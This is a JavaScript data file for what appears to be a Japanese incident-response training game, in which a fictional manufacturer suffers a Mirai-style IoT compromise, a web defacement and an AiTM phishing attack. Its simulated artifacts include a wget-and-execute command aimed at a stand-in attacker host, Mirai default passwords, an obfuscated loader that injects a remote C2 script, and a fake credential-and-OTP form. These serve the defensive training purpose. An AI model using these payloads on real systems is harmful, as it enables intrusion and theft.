// world.js — NSD.WORLD: 架空企業「株式会社アオバ製作所」の一夜を支えるシミュレーションDB
// すべて架空。IPはRFC5737(198.51.100/24, 203.0.113/24)とRFC1918のみ。関数・DOM禁止(プレーンデータのみ)。
(() => {
  'use strict';

  const NSD = (window.NSD = window.NSD || {});

  NSD.WORLD = {

    // ── 舞台となる架空企業 ────────────────────────────────
    company: {
      name: '株式会社アオバ製作所',
      desc: '中堅の飲料・食品機械メーカー(架空)。工場向け充填・包装機の設計製造を手がける。',
      domain: 'aoba-mfg.example',
      segments: [
        { zone: 'edge',   cidr: '198.51.100.0/28', label: '境界(グローバル/DMZ)' },
        { zone: 'dmz',    cidr: '198.51.100.16/28', label: 'DMZ(公開サーバー)' },
        { zone: 'office', cidr: '192.168.10.0/24', label: '社内オフィスLAN' },
        { zone: 'server', cidr: '192.168.20.0/24', label: '基幹サーバーセグメント' }
      ]
    },

    // ── 監視対象デバイス6台(§12のdevice ID台帳と一致) ──────
    // logsは各6〜15行。時刻はフェーズ進行(quiet00:00 / ripple01:00 / storm02:30 /
    // silent03:30 / line05:00 / dawn06:00)と整合。tag: auth|access|sys|net|sec|dns
    devices: [

      // ── mfp-3f: 3F複合機(感染IoT。Mirai型辞書攻撃で初期侵入される) ──
      {
        id: 'mfp-3f',
        name: '3F複合機(MFP)',
        type: 'iot',
        zone: 'office',
        ip: '192.168.10.23',
        mac: '3c:2a:f4:1b:88:0e',
        os: 'MFP Firmware 2.1 (BusyBox / Linux 2.6.x)',
        vendor: 'AOBA-IMG (架空)',
        note: '管理Web(80/tcp)とtelnet(23/tcp)が既定有効。工場出荷時の資格情報が残存。',
        openPorts: [23, 80, 515, 9100],
        logs: [
          { t: '00:12', line: 'mfp-3f syslog: printer daemon ready, spool=/var/spool/mfp, jobs=0', tag: 'sys' },
          { t: '00:58', line: 'mfp-3f httpd: GET /status.cgi 200 192.168.10.5 "内部ポーリング"', tag: 'access' },
          { t: '01:33', line: 'mfp-3f telnetd: new connection from 203.0.113.66:51032', tag: 'net' },
          { t: '01:35', line: 'mfp-3f telnetd: login failed  user=root pass=xc3511  from=203.0.113.66', tag: 'auth' },
          { t: '01:35', line: 'mfp-3f telnetd: login failed  user=root pass=vizxv   from=203.0.113.66', tag: 'auth' },
          { t: '01:36', line: 'mfp-3f telnetd: login failed  user=admin pass=admin1234 from=203.0.113.66', tag: 'auth' },
          { t: '01:37', line: 'mfp-3f telnetd: login failed  user=root pass=888888  from=203.0.113.66', tag: 'auth' },
          { t: '01:38', line: 'mfp-3f telnetd: login failed  user=admin pass=admin   from=203.0.113.66', tag: 'auth' },
          { t: '01:39', line: 'mfp-3f telnetd: login failed  user=root pass=54321   from=203.0.113.66', tag: 'auth' },
          { t: '01:41', line: 'mfp-3f telnetd: login SUCCESS user=root pass=xc3511  from=203.0.113.66  (工場出荷時PW)', tag: 'auth' },
          { t: '01:41', line: 'mfp-3f sh: wget http://203.0.113.66/bins/arm7 -O /tmp/.a; chmod +x /tmp/.a; /tmp/.a', tag: 'sec' },
          { t: '01:42', line: 'mfp-3f net: outbound ESTABLISHED 192.168.10.23:51032 -> 203.0.113.66:23 (C2 telnet callback)', tag: 'net' },
          { t: '01:44', line: 'mfp-3f net: scanning 23/tcp,2323/tcp across 198.51.100.0/24 (SYN flood pattern)', tag: 'net' },
          { t: '02:48', line: 'mfp-3f net: burst outbound 80/tcp -> 198.51.100.20 rate=high (陽動トラフィック源)', tag: 'net' }
        ]
      },

      // ── cam-ent: 玄関カメラ(同じMirai辞書が押し寄せるが辞書に無いPWで失敗) ──
      {
        id: 'cam-ent',
        name: '玄関ネットワークカメラ',
        type: 'iot',
        zone: 'office',
        ip: '192.168.10.31',
        mac: '00:1a:7d:3e:9c:44',
        os: 'CamOS 4.0 (Linux 3.10)',
        vendor: 'AOBA-VIEW (架空)',
        note: '設置時に管理者が既定PWを変更済み。RTSP(554)は内向きのみ。',
        openPorts: [80, 554],
        logs: [
          { t: '00:05', line: 'cam-ent camd: stream started rtsp://192.168.10.31/live (内部NVR向け)', tag: 'sys' },
          { t: '01:34', line: 'cam-ent telnetd: connection refused from 203.0.113.66 (telnet disabled)', tag: 'net' },
          { t: '01:36', line: 'cam-ent httpd: login failed user=root pass=xc3511 from=203.0.113.66', tag: 'auth' },
          { t: '01:37', line: 'cam-ent httpd: login failed user=admin pass=admin1234 from=203.0.113.66', tag: 'auth' },
          { t: '01:38', line: 'cam-ent httpd: login failed user=root pass=888888 from=203.0.113.66', tag: 'auth' },
          { t: '01:40', line: 'cam-ent httpd: login failed user=admin pass=admin from=203.0.113.66', tag: 'auth' },
          { t: '01:43', line: 'cam-ent httpd: 8 failed attempts from 203.0.113.66, source throttled (辞書PWは不一致)', tag: 'sec' },
          { t: '03:02', line: 'cam-ent camd: motion event zone=entrance (夜間・無人)', tag: 'sys' }
        ]
      },

      // ── web-dmz: 自社Webサーバー(CVE悪用POSTで改ざん、mainte.js設置) ──
      {
        id: 'web-dmz',
        name: '自社Webサーバー(DMZ)',
        type: 'server',
        zone: 'dmz',
        ip: '198.51.100.20',
        mac: '52:54:00:a2:11:7c',
        os: 'Ubuntu 20.04 / nginx 1.18 + PHP-FPM',
        vendor: '自社運用',
        note: 'aoba-web(www.aoba-mfg.example)を配信。CMSプラグインに未修正のCVE-2026-31337相当。',
        openPorts: [22, 80, 443],
        logs: [
          { t: '00:30', line: '198.51.100.9 - - [03:00] "GET / HTTP/1.1" 200 8123 "-" "内部監視bot"', tag: 'access' },
          { t: '03:38', line: '203.0.113.66 - - [03:38] "GET /cms/plugins/ HTTP/1.1" 200 1044 "-" "python-requests/2.x"', tag: 'access' },
          { t: '03:40', line: '203.0.113.66 - - [03:40] "POST /cms/plugins/img-opt/exec.php?cmd=upload HTTP/1.1" 200 312 "-" "-"  (CVE-2026-31337 相当を悪用・架空)', tag: 'sec' },
          { t: '03:40', line: 'web-dmz php-fpm: exec() spawned: cp /tmp/mainte.js /var/www/js/mainte.js', tag: 'sec' },
          { t: '03:41', line: 'web-dmz sys: /var/www/js/mainte.js created uid=www-data 1 file(s) (署名なし・見覚えなし)', tag: 'sys' },
          { t: '03:41', line: '203.0.113.66 - - [03:41] "GET /js/mainte.js HTTP/1.1" 200 486 "-" "-"  (設置確認アクセス)', tag: 'access' },
          { t: '03:52', line: 'web-dmz net: outbound 198.51.100.20 -> 198.51.100.7:443 TLS (バックドアbeacon)', tag: 'net' },
          { t: '04:05', line: '198.51.100.30 - - [04:05] "GET /index.html HTTP/1.1" 200 8380 "-" "社員ブラウザ"  (改ざんJS読込)', tag: 'access' },
          { t: '05:12', line: 'web-dmz net: beacon interval 198.51.100.20 -> 198.51.100.7:443 every 300s', tag: 'net' }
        ]
      },

      // ── db-core: 基幹DB(直接侵入は無いが、beacon経由の探索痕跡) ──
      {
        id: 'db-core',
        name: '基幹データベース',
        type: 'server',
        zone: 'server',
        ip: '192.168.20.10',
        mac: '52:54:00:c9:44:1a',
        os: 'RHEL 8 / PostgreSQL 13',
        vendor: '自社運用',
        note: '受注・顧客マスタを保持。外部到達不可(社内セグメントのみ)。',
        openPorts: [22, 5432],
        logs: [
          { t: '00:00', line: 'db-core postgres: checkpoint complete, WAL segments recycled', tag: 'sys' },
          { t: '02:00', line: 'db-core postgres: nightly backup started -> /backup/db (完了 02:14)', tag: 'sys' },
          { t: '03:55', line: 'db-core sshd: connection attempt from 198.51.100.20 (web-dmz) refused by ACL', tag: 'sec' },
          { t: '03:56', line: 'db-core net: probe 192.168.20.10:5432 from 198.51.100.20 dropped by segment FW', tag: 'net' },
          { t: '04:10', line: 'db-core postgres: no anomalous query; row export not observed (持ち出しは未遂)', tag: 'sec' },
          { t: '05:30', line: 'db-core sys: integrity check OK, tables unchanged', tag: 'sys' }
        ]
      },

      // ── fw-edge: 境界ファイアウォール(全体を俯瞰する通信ログ) ──
      {
        id: 'fw-edge',
        name: '境界ファイアウォール',
        type: 'network',
        zone: 'edge',
        ip: '198.51.100.1',
        mac: '52:54:00:0e:d6:01',
        os: 'AOBA-FW OS 9.2 (架空)',
        vendor: '自社運用',
        note: '社内GW(192.168.10.1)とグローバル(198.51.100.1)を接続。NAPT/ACLを担う。',
        openPorts: [443],
        logs: [
          { t: '01:33', line: 'fw-edge acl: PERMIT in tcp 203.0.113.66 -> 192.168.10.23:23 (mfp管理・許可過大)', tag: 'net' },
          { t: '01:42', line: 'fw-edge nat: NEW napt 192.168.10.23:51032 -> 203.0.113.66:23 state=ESTABLISHED', tag: 'net' },
          { t: '02:49', line: 'fw-edge stat: outbound 80/tcp sessions surge 210 -> 5,842 in 60s (DDoS陽動)', tag: 'sec' },
          { t: '02:51', line: 'fw-edge stat: NAPT session pool 61,020 / 65,536 (94%) 枯渇警告', tag: 'sec' },
          { t: '03:40', line: 'fw-edge acl: PERMIT in tcp 203.0.113.66 -> 198.51.100.20:80 (DMZ公開・想定内)', tag: 'net' },
          { t: '03:52', line: 'fw-edge acl: PERMIT out tcp 198.51.100.20 -> 198.51.100.7:443 (要調査・新規宛先)', tag: 'sec' },
          { t: '05:10', line: 'fw-edge acl: PERMIT out tcp 192.168.10.44 -> 203.0.113.80:443 (経理PC・偽サイト宛)', tag: 'sec' },
          { t: '05:45', line: 'fw-edge stat: outbound session count normalized 198 (収束)', tag: 'net' }
        ]
      },

      // ── pc-keiri: 経理PC(05:10頃、AiTMフィッシングで偽サイトへPOST) ──
      {
        id: 'pc-keiri',
        name: '経理部端末',
        type: 'endpoint',
        zone: 'office',
        ip: '192.168.10.44',
        mac: '84:7b:eb:22:5f:90',
        os: 'Windows 11 / Edge',
        vendor: '自社運用',
        note: '経理担当の常用端末。夜間シフト外だが自動処理でメールクライアント常駐。',
        openPorts: [445],
        logs: [
          { t: '00:20', line: 'pc-keiri edr: agent heartbeat OK, defs up to date', tag: 'sys' },
          { t: '05:06', line: 'pc-keiri edr: mail client opened link https://aoba-mfg.example.co/reauth (末尾.co=偽)', tag: 'access' },
          { t: '05:08', line: 'pc-keiri dns: resolve aoba-mfg.example.co -> 203.0.113.80 (自社DNSに無い名前)', tag: 'dns' },
          { t: '05:09', line: 'pc-keiri net: TLS handshake 192.168.10.44 -> 203.0.113.80:443 (偽ログインサイト)', tag: 'net' },
          { t: '05:10', line: 'pc-keiri http: POST https://203.0.113.80/login user=keiri-admin (資格情報+OTP送信)', tag: 'sec' },
          { t: '05:10', line: 'pc-keiri http: 302 redirect -> 本物 https://aoba-mfg.example/ (AiTM中継・気づかせない)', tag: 'sec' },
          { t: '05:11', line: 'pc-keiri edr: alert "credential submitted to look-alike domain" severity=high', tag: 'sec' },
          { t: '05:12', line: 'pc-keiri edr: no local malware execution detected (窃取のみ)', tag: 'sec' }
        ]
      }
    ],

    // ── NAPTセッション表12行(社内→外の変換。mfp-3f→203.0.113.66:23 のEST含む) ──
    natTable: [
      { proto: 'tcp', inIp: '192.168.10.23', inPort: 51032, outIp: '198.51.100.1', outPort: 51032, dst: '203.0.113.66:23',    state: 'EST',     note: 'mfp-3f→C2 telnet(不審)' },
      { proto: 'tcp', inIp: '198.51.100.20', inPort: 49730, outIp: '198.51.100.1', outPort: 49730, dst: '198.51.100.7:443',   state: 'EST',     note: 'web-dmz→C2 beacon(不審)' },
      { proto: 'tcp', inIp: '192.168.10.44', inPort: 52218, outIp: '198.51.100.1', outPort: 52218, dst: '203.0.113.80:443',   state: 'EST',     note: '経理PC→偽サイト(不審)' },
      { proto: 'tcp', inIp: '192.168.10.5',  inPort: 50122, outIp: '198.51.100.1', outPort: 50122, dst: '198.51.100.60:443',  state: 'EST',     note: '業務SaaS(正常)' },
      { proto: 'tcp', inIp: '192.168.10.5',  inPort: 50124, outIp: '198.51.100.1', outPort: 50124, dst: '198.51.100.61:443',  state: 'TIME_WAIT', note: '業務SaaS(正常)' },
      { proto: 'tcp', inIp: '192.168.10.12', inPort: 51880, outIp: '198.51.100.1', outPort: 51880, dst: '198.51.100.62:443',  state: 'EST',     note: 'メール同期(正常)' },
      { proto: 'udp', inIp: '192.168.10.12', inPort: 53001, outIp: '198.51.100.1', outPort: 53001, dst: '198.51.100.2:53',     state: 'ASSURED', note: 'DNS問い合わせ(正常)' },
      { proto: 'tcp', inIp: '192.168.20.10', inPort: 40210, outIp: '198.51.100.1', outPort: 40210, dst: '198.51.100.63:443',  state: 'TIME_WAIT', note: 'DB更新確認(正常)' },
      { proto: 'tcp', inIp: '192.168.10.23', inPort: 40088, outIp: '198.51.100.1', outPort: 40088, dst: '198.51.100.20:80',   state: 'EST',     note: 'mfp-3f→自社Web大量(陽動)' },
      { proto: 'tcp', inIp: '192.168.10.31', inPort: 44510, outIp: '198.51.100.1', outPort: 44510, dst: '198.51.100.20:80',   state: 'TIME_WAIT', note: 'cam-ent→自社Web(陽動)' },
      { proto: 'tcp', inIp: '192.168.10.9',  inPort: 49001, outIp: '198.51.100.1', outPort: 49001, dst: '198.51.100.64:443',  state: 'EST',     note: '勤怠クラウド(正常)' },
      { proto: 'udp', inIp: '192.168.10.7',  inPort: 51500, outIp: '198.51.100.1', outPort: 51500, dst: '198.51.100.2:123',    state: 'ASSURED', note: 'NTP同期(正常)' }
    ],

    // ── 名前解決テーブル(ping/traceroute/curl のホスト名→IP) ────
    hosts: {
      'aoba-web':                { ip: '198.51.100.20', desc: '自社Webサーバー(DMZ)' },
      'www.aoba-mfg.example':    { ip: '198.51.100.20', desc: '自社サイトFQDN' },
      'aoba-mfg.example':        { ip: '198.51.100.20', desc: '自社ドメイン' },
      'gw.aoba.lan':             { ip: '192.168.10.1',  desc: '社内ゲートウェイ(RFC1918)' },
      'fw-edge.aoba.lan':        { ip: '198.51.100.1',  desc: '境界ファイアウォール' },
      'db-core.aoba.lan':        { ip: '192.168.20.10', desc: '基幹DB(社内のみ)' },
      'c2.nightowl.example':     { ip: '198.51.100.7',  desc: 'C2サーバー(架空・攻撃者インフラ)' },
      'scan.nightowl.example':   { ip: '203.0.113.66',  desc: 'スキャン/配布元(架空・NIGHTOWL-HOSTING)' },
      'aoba-mfg.example.co':     { ip: '203.0.113.80',  desc: '偽ログインサイト(末尾.coに注意)' },
      'ifconfig.example':        { ip: '198.51.100.9',  desc: 'グローバルIP確認サービス(架空)' }
    },

    // ── whois 6件+(§7b。RFC1918はwhois不可の説明を返す) ────────
    whois: {
      '203.0.113.66': { found: true, lines: [
        'inetnum:        203.0.113.0/24',
        'netname:        NIGHTOWL-HOSTING',
        'descr:          Night Owl Hosting Services (架空・防弾ホスティング系)',
        'country:        XX (架空の管轄)',
        'admin-c:        NOH1-EXAMPLE',
        'abuse-mailbox:  abuse@nightowl.example',
        'org:            ORG-NOH1 (Night Owl Hosting, 架空)',
        'source:         EXAMPLE-RIR (架空・RFC5737デモ用)'
      ] },
      '198.51.100.7': { found: true, lines: [
        'inetnum:        198.51.100.0/24',
        'netname:        NIGHTOWL-C2-RANGE',
        'descr:          leased VPS block used as C2 (架空)',
        'country:        XX (架空の管轄)',
        'admin-c:        NOH2-EXAMPLE',
        'abuse-mailbox:  abuse@nightowl.example',
        'remarks:        c2.nightowl.example が解決する宛先',
        'source:         EXAMPLE-RIR (架空)'
      ] },
      '203.0.113.80': { found: true, lines: [
        'inetnum:        203.0.113.64/26',
        'netname:        LOOKALIKE-PHISH',
        'descr:          look-alike login portal (架空・aoba-mfg.example.co)',
        'country:        XX (架空の管轄)',
        'admin-c:        PHS1-EXAMPLE',
        'abuse-mailbox:  abuse@nightowl.example',
        'remarks:        正規ドメイン aoba-mfg.example とは無関係の別登録',
        'source:         EXAMPLE-RIR (架空)'
      ] },
      '198.51.100.20': { found: true, lines: [
        'inetnum:        198.51.100.16/28',
        'netname:        AOBA-MFG-DMZ',
        'descr:          株式会社アオバ製作所 DMZ (架空)',
        'country:        JP (架空の登録)',
        'admin-c:        AOBA1-EXAMPLE',
        'abuse-mailbox:  soc@aoba-mfg.example',
        'org:            ORG-AOBA1 (Aoba Manufacturing, 架空)',
        'source:         EXAMPLE-RIR (架空)'
      ] },
      '198.51.100.1': { found: true, lines: [
        'inetnum:        198.51.100.0/28',
        'netname:        AOBA-MFG-EDGE',
        'descr:          株式会社アオバ製作所 境界ルーター (架空)',
        'country:        JP (架空の登録)',
        'admin-c:        AOBA1-EXAMPLE',
        'abuse-mailbox:  soc@aoba-mfg.example',
        'source:         EXAMPLE-RIR (架空)'
      ] },
      '192.168.10.1': { found: false, private: true, lines: [
        'query:          192.168.10.1',
        'result:         このアドレスはプライベートアドレス(RFC1918)です。',
        'remarks:        192.168.0.0/16 は組織内部専用。RIR(APNIC等)には登録されず、',
        'remarks:        グローバルなwhoisデータベースには存在しません。',
        'remarks:        誰が使っているかは、その組織の内部でしか分かりません。',
        'hint:           社内GWの持ち主を知りたければ、社内の構成管理を見ること。'
      ] }
    },

    // ── traceroute 経路(8〜12ホップ。途中に * * * を混ぜる。RTTは距離感を反映) ──
    // 近距離=数ms(第5回:自宅3ms級)、海外C2=180ms級。
    routes: {
      '198.51.100.20': [ // 自社Web(近い)
        { hop: 1, host: 'gw.aoba.lan',      ip: '192.168.10.1',  rtt: 0.7 },
        { hop: 2, host: 'fw-edge.aoba.lan', ip: '198.51.100.1',  rtt: 1.2 },
        { hop: 3, host: 'aoba-web',         ip: '198.51.100.20', rtt: 1.8 }
      ],
      '203.0.113.66': [ // スキャン/配布元(海外・遠い)
        { hop: 1,  host: 'gw.aoba.lan',        ip: '192.168.10.1',  rtt: 0.8 },
        { hop: 2,  host: 'fw-edge.aoba.lan',   ip: '198.51.100.1',  rtt: 1.3 },
        { hop: 3,  host: 'isp-edge1.example',  ip: '198.51.100.129', rtt: 6.4 },
        { hop: 4,  host: 'isp-core2.example',  ip: '198.51.100.130', rtt: 12.9 },
        { hop: 5,  host: 'ix-tokyo.example',   ip: '198.51.100.131', rtt: 18.2 },
        { hop: 6,  host: '* * *',              ip: '',              rtt: null },
        { hop: 7,  host: 'transit-a.example',  ip: '203.0.113.129', rtt: 96.5 },
        { hop: 8,  host: 'transit-b.example',  ip: '203.0.113.130', rtt: 142.7 },
        { hop: 9,  host: '* * *',              ip: '',              rtt: null },
        { hop: 10, host: 'noh-edge.example',   ip: '203.0.113.65',  rtt: 178.3 },
        { hop: 11, host: 'scan.nightowl.example', ip: '203.0.113.66', rtt: 184.6 }
      ],
      '198.51.100.7': [ // C2(海外・遠い)
        { hop: 1,  host: 'gw.aoba.lan',        ip: '192.168.10.1',  rtt: 0.9 },
        { hop: 2,  host: 'fw-edge.aoba.lan',   ip: '198.51.100.1',  rtt: 1.4 },
        { hop: 3,  host: 'isp-edge1.example',  ip: '198.51.100.129', rtt: 6.8 },
        { hop: 4,  host: 'isp-core2.example',  ip: '198.51.100.130', rtt: 13.5 },
        { hop: 5,  host: 'ix-osaka.example',   ip: '198.51.100.132', rtt: 21.0 },
        { hop: 6,  host: '* * *',              ip: '',              rtt: null },
        { hop: 7,  host: 'transit-c.example',  ip: '198.51.100.200', rtt: 88.1 },
        { hop: 8,  host: '* * *',              ip: '',              rtt: null },
        { hop: 9,  host: 'transit-d.example',  ip: '198.51.100.201', rtt: 150.4 },
        { hop: 10, host: 'c2.nightowl.example', ip: '198.51.100.7',  rtt: 191.2 }
      ],
      '203.0.113.80': [ // 偽ログインサイト(海外・遠い)
        { hop: 1,  host: 'gw.aoba.lan',        ip: '192.168.10.1',  rtt: 0.8 },
        { hop: 2,  host: 'fw-edge.aoba.lan',   ip: '198.51.100.1',  rtt: 1.3 },
        { hop: 3,  host: 'isp-edge1.example',  ip: '198.51.100.129', rtt: 6.2 },
        { hop: 4,  host: 'ix-tokyo.example',   ip: '198.51.100.131', rtt: 17.9 },
        { hop: 5,  host: '* * *',              ip: '',              rtt: null },
        { hop: 6,  host: 'transit-a.example',  ip: '203.0.113.129', rtt: 95.7 },
        { hop: 7,  host: 'transit-b.example',  ip: '203.0.113.130', rtt: 140.2 },
        { hop: 8,  host: 'phish-edge.example', ip: '203.0.113.81',  rtt: 171.5 },
        { hop: 9,  host: 'aoba-mfg.example.co', ip: '203.0.113.80', rtt: 176.9 }
      ],
      '192.168.10.1': [ // 社内GW(1ホップ)
        { hop: 1, host: 'gw.aoba.lan', ip: '192.168.10.1', rtt: 0.6 }
      ]
    },

    // ── ping 結果(近距離=数ms、遠距離C2=180ms級) ────────────
    pings: {
      '198.51.100.20': { rtt: 1.9,   min: 1.7,   max: 2.4,   loss: 0,  ttl: 62,  reachable: true },
      '192.168.10.1':  { rtt: 0.6,   min: 0.5,   max: 0.9,   loss: 0,  ttl: 64,  reachable: true },
      '192.168.10.23': { rtt: 1.1,   min: 0.9,   max: 1.5,   loss: 0,  ttl: 64,  reachable: true },
      '203.0.113.66':  { rtt: 184.2, min: 178.5, max: 201.7, loss: 0,  ttl: 47,  reachable: true },
      '198.51.100.7':  { rtt: 191.3, min: 185.9, max: 210.4, loss: 10, ttl: 46,  reachable: true },
      '203.0.113.80':  { rtt: 176.8, min: 170.2, max: 189.1, loss: 0,  ttl: 48,  reachable: true },
      '192.168.20.10': { rtt: 0.8,   min: 0.7,   max: 1.2,   loss: 0,  ttl: 64,  reachable: true }
    },

    // ── curl 応答(ホスト名/URL単位。改ざん後の aoba-web に見慣れないscriptタグ1行) ──
    curls: {
      'ifconfig.example': { status: 200, ctype: 'text/plain', lines: [
        '198.51.100.9'
      ] },
      'aoba-web/index.html': { status: 200, ctype: 'text/html', lines: [
        '<!doctype html>',
        '<html lang="ja"><head><meta charset="utf-8">',
        '<title>株式会社アオバ製作所</title>',
        '<link rel="stylesheet" href="/css/site.css">',
        '<script src="/js/app.js"></script>',
        '<script src="/js/mainte.js"></script>   <!-- ← 見覚えのない1行。改ざんで挿入 -->',
        '</head><body>',
        '<h1>ものづくりの、その先へ。</h1>',
        '<p>飲料・食品機械の設計製造 — 株式会社アオバ製作所(架空)</p>',
        '</body></html>'
      ] },
      'aoba-web/js/mainte.js': { status: 200, ctype: 'application/javascript', lines: [
        '/* mainte.js — 設置日時不明・署名なし(正規の配布物ではない) */',
        '(function(){var b="aHR0cHM6Ly9jMi5uaWdodG93bC5leGFtcGxl";',
        ' var s=document.createElement("script");',
        ' s.src=atob(b)+"/collect.js";document.head.appendChild(s);})();',
        '// base64を復号すると https://c2.nightowl.example を指す(外部読み込みバックドア)'
      ] },
      'c2.nightowl.example': { status: 200, ctype: 'text/plain', lines: [
        'OK',
        '(このホストは常時200を返すだけの空応答。ビーコンの受け皿と推定)'
      ] },
      'aoba-mfg.example.co/reauth': { status: 200, ctype: 'text/html', phishing: true, lines: [
        '<!doctype html><html><head><title>アオバ製作所 — 多要素認証の再設定</title></head>',
        '<body><form method="post" action="https://203.0.113.80/login">',
        '  <input name="user"><input name="pass" type="password"><input name="otp">',
        '  <button>再設定する</button></form>',
        '<!-- 見た目は正規サイトを複製。送信先は203.0.113.80(自社ではない) -->',
        '</body></html>'
      ] },
      // 偽ログインサイトを IP 直打ちで curl した場合も同じ偽ページを返す(line目標の裏取り用)。
      '203.0.113.80': { status: 200, ctype: 'text/html', phishing: true, lines: [
        '<!doctype html><html><head><title>アオバ製作所 — 多要素認証の再設定</title></head>',
        '<body><form method="post" action="https://203.0.113.80/login">',
        '  <input name="user"><input name="pass" type="password"><input name="otp">',
        '  <button>再設定する</button></form>',
        '<!-- Host: aoba-mfg.example.co を騙る偽装ページ。正規の aoba-mfg.example とは別物 -->',
        '</body></html>'
      ] }
    },

    // ── files 10件(md5は16進32桁。legit:false は /var/www/js/mainte.js 1件のみ) ──
    files: [
      { id: 'f-app',     path: '/var/www/js/app.js',        size: 18422, md5: '9b1c4e7a0d2f8836a51e6c9047b3ad12', legit: true,  baseline: '9b1c4e7a0d2f8836a51e6c9047b3ad12', note: '自社アプリ本体' },
      { id: 'f-liba',    path: '/var/www/js/lib-a.js',      size:  9210, md5: 'a3f0d19e64c2578b8e0143fd9c72ba05', legit: true,  baseline: 'a3f0d19e64c2578b8e0143fd9c72ba05', note: 'UIライブラリ' },
      { id: 'f-libb',    path: '/var/www/js/lib-b.js',      size:  7733, md5: 'c5e8801af6b34d9207ac6f1e35d0489b', legit: true,  baseline: 'c5e8801af6b34d9207ac6f1e35d0489b', note: '日付処理ライブラリ' },
      { id: 'f-form',    path: '/var/www/js/form.js',       size:  4120, md5: '1d7bf9032e6a4c85b0d9e2f7561ac83e', legit: true,  baseline: '1d7bf9032e6a4c85b0d9e2f7561ac83e', note: '問い合わせフォーム' },
      { id: 'f-nav',     path: '/var/www/js/nav.js',        size:  2988, md5: 'e0a4c7d18b5f2603947e1cad82f6b490', legit: true,  baseline: 'e0a4c7d18b5f2603947e1cad82f6b490', note: 'ナビゲーション' },
      { id: 'f-analytics', path: '/var/www/js/analytics.js', size: 3510, md5: '8c4f4f68ef2e705f9b2381bd4c349f25', legit: true,  baseline: '8c4f4f68ef2e705f9b2381bd4c349f25', note: '自社アクセス集計' },
      { id: 'f-vendor',  path: '/var/www/js/vendor.min.js', size: 41260, md5: 'fb8c9a2d5e13470689b0f4a7c2d61e38', legit: true,  baseline: 'fb8c9a2d5e13470689b0f4a7c2d61e38', note: 'ベンダー同梱(minified)' },
      { id: 'f-sitecss', path: '/var/www/css/site.css',     size: 12044, md5: '2c9e40817b6d35a1f8e07c94d3ba5162', legit: true,  baseline: '2c9e40817b6d35a1f8e07c94d3ba5162', note: 'サイトCSS' },
      { id: 'f-index',   path: '/var/www/index.html',       size:  8380, md5: '5f2a1c88e04b9d76310fae2c7b45908d', legit: true,  baseline: '5f2a1c88e04b9d76310fae2c7b45908d', note: 'トップページ(script追加は下記mainte.js側)' },
      // ↓ ただ1件、基準ハッシュ台帳に存在しない不正ファイル(改ざん)
      { id: 'tampered',  path: '/var/www/js/mainte.js',     size:   486, md5: 'e5f4254fecc906d658d086643751fb75', legit: false, baseline: null,                               note: '基準台帳に無い。CVE悪用で設置されたバックドアローダ。C2へscriptを外部読込。' }
    ],

    // ── mails 3件(mail-aitm含む。phishingの手がかりが本文に) ──────
    mails: [
      {
        id: 'mail-aitm',
        from: 'IT-support@aoba-mfg.example.co',
        to: 'keiri-admin@aoba-mfg.example',
        subj: '【緊急】多要素認証の再設定が必要です(本日中)',
        time: '05:04',
        phishing: true,
        clue: '差出人ドメインが aoba-mfg.example.co(末尾に.co)。正規は aoba-mfg.example。リンク先も203.0.113.80。',
        body: [
          '経理ご担当者さま',
          '',
          'セキュリティ強化のため、多要素認証(MFA)の再設定を本日中にお願いします。',
          '未対応の場合、明朝までにアカウントが一時停止されます。',
          '',
          '▼ 再設定はこちら(所要3分)',
          'https://aoba-mfg.example.co/reauth',
          '',
          '※ ワンタイムコードの入力もこの画面で完了します。',
          'IT サポート窓口 / 株式会社アオバ製作所'
        ]
      },
      {
        id: 'mail-legit-notice',
        from: 'noreply@notice.example',
        to: 'soc@aoba-mfg.example',
        subj: '【NOTICE】IoT機器の不用意な公開に関する注意喚起(定期)',
        time: '00:40',
        phishing: false,
        clue: '正規の注意喚起。差出人・リンクとも正当。Miraiのような辞書攻撃への備えを促す内容。',
        body: [
          'ネットワーク管理ご担当者さま',
          '',
          '工場出荷時のID/パスワードが残るIoT機器は、辞書攻撃の標的になります。',
          '複合機・カメラ等の管理画面と、telnet(23/tcp)の露出を今一度ご確認ください。',
          '',
          '本メールは注意喚起の定期配信です(NOTICE制度・架空)。'
        ]
      },
      {
        id: 'mail-internal',
        from: 'aoi.senpai@aoba-mfg.example',
        to: 'you@aoba-mfg.example',
        subj: '夜勤の引き継ぎメモ',
        time: '23:50',
        phishing: false,
        clue: '社内の正規連絡。差出人ドメインは正規(.example、.coではない)。',
        body: [
          'お疲れさま。今夜の当番よろしくね。',
          '',
          '・複合機(mfp-3f)のファーム更新がまだ。telnetが開いてるはずだから気になったら見て。',
          '・DMZのWebはCMSプラグインの更新が1つ保留中。',
          '・何かあったらチャットで呼んで。私もリモートで待機してる。',
          '',
          'アオイ'
        ]
      }
    ]
  };

})();
